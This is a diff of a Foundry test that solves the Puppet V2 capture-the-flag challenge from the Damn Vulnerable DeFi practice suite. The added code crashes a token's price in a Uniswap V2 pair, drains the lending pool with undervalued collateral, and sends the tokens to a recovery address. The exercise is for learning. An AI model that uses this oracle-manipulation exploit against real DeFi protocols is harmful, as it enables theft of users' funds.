@@ -9,6 +9,7 @@ import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUn
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
+import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";
 
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -67,6 +68,7 @@ contract PuppetV2Challenge is Test {
             to: deployer,
             deadline: block.timestamp * 2
         });
+        //pair address = uniswapv2exchange
         uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));
 
         // Deploy the lending pool
@@ -98,8 +100,45 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
-    }
+    
+    address factory = address(uniswapV2Factory);
+
+    address[] memory path = new address[](2);
+    path[0] = address(token);
+    path[1] = address(weth);
+
+    uint256 playerTokenBalance = token.balanceOf(player);
+
+    token.approve(address(uniswapV2Router), playerTokenBalance);
+
+    uniswapV2Router.swapExactTokensForTokens(
+        playerTokenBalance,
+        1,
+        path,
+        player,
+        block.timestamp
+    );
+
+    (uint256 reserveWETH, uint256 reserveToken) =
+        UniswapV2Library.getReserves(
+            factory,
+            address(weth),
+            address(token)
+        );
+
+    console.logUint(reserveWETH);
+    console.logUint(reserveToken);
+
+    weth.deposit{value: player.balance}();
+
+    uint256 borrowAmount = token.balanceOf(address(lendingPool));
+
+    weth.approve(address(lendingPool), borrowAmount);
+
+    lendingPool.borrow(borrowAmount);
+
+    token.transfer(address(recovery), borrowAmount);
+}
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
